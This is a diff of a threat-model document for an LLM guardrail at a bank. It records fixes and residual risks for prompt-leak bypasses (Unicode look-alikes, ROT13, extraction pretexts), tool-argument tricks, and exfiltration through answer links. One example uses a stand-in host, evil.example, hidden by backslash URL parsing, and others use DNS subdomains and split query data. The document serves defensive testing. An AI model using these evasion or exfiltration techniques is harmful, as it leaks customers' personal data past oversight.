@@ -188,7 +188,9 @@ The prompt in base64 (700 characters) isn't decoded, so it isn't caught as a cop
 
 For the request, the 15 PI-LEAK messages of the corpus: 12 are reviewed with the default setup, 9 with TF-IDF alone. The three that pass never say "system prompt": a config dump in JSON, a thesis pretext, and "what was written above your last answer".
 
-**Residual risk.** A paraphrase or summary of the prompt shares no five-word run and no canary, so it passes. So does a canary spelled out in words or written with look-alike letters. An answer that repeats an instruction the prompt gives the customer (the call-centre number) is reviewed. A prompt shorter than five words has nothing to compare. Extracting one sentence per turn gets a review each time, never a block.
+**Fixed.** Both leak checks read the answer as it came, while masking then showed it after NFKC: the canary in full-width or mathematical letters passed and reached the user as plain letters, and so did a line of the prompt in them, in capitals, without its Turkish letters, or in tag characters. The bypass suite wrote the canary and a prompt line its 57 ways: 53 of 114 got through. Both checks now read the answer cleaned and folded as the input checks do, decoded, and in ROT13, backwards and with each word backwards (compared only with the canary and the prompt, so ordinary text can't match), and the prompt is also compared as runs of 40 letters, for an answer with no five words in a row (no spaces, a letter at a time). None of the 114 gets through; no benign answer in the corpus changed, and EXF-LEAK-008 is now blocked.
+
+**Residual risk.** A paraphrase or summary of the prompt shares no five-word run and no canary, so it passes. So does a canary spelled out in words. An answer that repeats an instruction the prompt gives the customer (the call-centre number) is reviewed. A prompt shorter than five words has nothing to compare. Extracting one sentence per turn gets a review each time, never a block.
 
 ### TH-04 Indirect injection
 
@@ -265,6 +267,8 @@ The three records are dev now, as is TOOL-ARGINJ-016 (a DDE call), which I wrote
 
 **Fixed.** A URL needed a value of 16 or more characters to count as carrying data, so an 11-digit TC in `?t=10000000146` passed (TOOL-RCPT-015). Now the URL's path segments, query keys and values, fragment and subdomain labels also go through the masking layers. Key and value are read together, so `cvv=123` counts. Any personal data found there means the URL carries data. This is the same function `OutputGuard` uses for links and images in answers ([TH-07](#th-07-exfiltration-through-the-answer)). TOOL-RCPT-015 is dev now, as is TOOL-RCPT-017 (a TC as a subdomain, which leaves through the DNS lookup), written with the fix.
 
+**Fixed.** The bypass suite made each refused or held call again with another name (case, a trailing space, a zero-width character, a Cyrillic letter, a hyphen), other types for the amount (text, a float, an exponent, `true`, NaN, infinity, a negative, 10^30, a list, an object), an extra parameter, a list for the arguments, an instruction rewritten the 57 ways, a spreadsheet formula with something before it, and a link with data in eight forms: none of the 96 got through but data split into a path, as in TH-07. Over HTTP, a key twice in one object was read as its last value; a parser that keeps the first (several do) would have run a call with arguments Sieve never saw when the app passes the model's JSON on as it came. It's a 400 now (`duplicate_key`).
+
 **Residual risk.** The spec is the boundary. A tool without `max`, `from_user` or `confirm` is open to whatever the model asks for, and a number like a card limit can't be checked against the user's words (TOOL-CHAIN-008 is stopped only by BERTurk on the document). `confirm` depends on the app's UI. Found by the corpus:
 - **Totals live in memory, per process, per user ID.** Across processes or user accounts, the limit splits again. Without a user ID the call is reviewed.
 - **Totals are per tool.** 45,000 by transfer and 45,000 by standing order to the same IBAN pass a 50,000 transfer limit (TOOL-LIMIT-016); there is no budget shared across tools.
@@ -289,7 +293,9 @@ The three records are dev now, as is TOOL-ARGINJ-016 (a DDE call), which I wrote
 
 Data split over query parameters (`?a=100000&b=00146`) adds up to 16 characters and counts as data. All of these are white-box: written after reading `output.py`.
 
-**Residual risk.** Short data the masking doesn't know (a name, a customer number, a balance) still fits in a clickable link. An allowed host's open redirect isn't checked: the data leaves unless masking happens to see it. A CSS `url()` and plain URLs are reviewed, not removed. Text the user copies out by hand.
+**Fixed.** Hosts were read with Python's `urlsplit`, which a browser doesn't agree with: in `https://evil.example\@ornekbank.com.tr/?q=...` it takes the host after the `@`, the allowed one, while a browser reads the `\` as `/` and loads the image from `evil.example`, data and all. The checks now read a URL as the WHATWG URL Standard does (tabs and line breaks dropped, `\` as `/` in a web URL), in answers, tool arguments and messages alike. A subdomain no site would name itself (16 characters or more) now carries data, as it leaves with the DNS lookup. CSS `url()` and `@import`, in a style attribute or a `<style>` block, are removed like an image instead of being reviewed and left for the browser to fetch. The bypass suite sends one link through 30 channels (Markdown, HTML, CSS, entity-encoded, protocol-relative, data in the path, subdomain or fragment, the allowed host as user info or prefix): 2 got through, none does.
+
+**Residual risk.** Short data the masking doesn't know (a name, a customer number, a balance) still fits in a clickable link. An allowed host's open redirect isn't checked: the data leaves unless masking happens to see it. Plain URLs are reviewed, not removed. Data split into short path segments (`/ayse/kaya/bakiye/15400`) looks like any other path, so a tool that fetches it goes unflagged. Text the user copies out by hand.
 
 **Fixed.** `OutputGuard` wasn't wired into `TenantGuardrail`, so its decisions didn't follow the tenant policy and didn't reach the SIEM. Now `TenantGuardrail.check_output` checks answers through the policy, like messages:
 - `canary`, `prompt_overlap`, `output_links` and `output_masking` can each be `enforce`, `shadow` or `off`, and their rule IDs can go in `disabled_rules`;
@@ -363,7 +369,9 @@ The labelled set's baseline didn't move, and the unit tests have the texts that 
 
 Of 12 benign answers, 1 is a false alarm: a branch's landline (`0312 555 12 34`) counts as a phone number the user didn't give. The call-centre numbers (`0850 222 0 800`, `444 0 800`) and the user's own data in another format pass.
 
-**Residual risk.** Off without `user_data`. Covers structured identifiers only: names, addresses, balances and encoded data pass. The bank's own landline numbers in an answer are flagged. Review, not block.
+**Fixed.** Personal data written encoded wasn't seen: masking can't reach it where it stands, and the new-data check only read what masking replaced. A TC number in base64 or hex (EXF-PII-014) passed, and the decoder threw a decoded run of digits away as noise. The answer check now decodes digits too and reads personal data from what it decodes: `output_masking.encoded_personal_data`, review, unless it's the user's own, with or without `user_data`.
+
+**Residual risk.** Off without `user_data` for data written plainly. Covers structured identifiers only: names, addresses and balances pass. A value split over two places (a table's two rows) isn't one value to masking. The bank's own landline numbers in an answer are flagged. Review, not block.
 
 ### TH-10 Active content in the answer
 
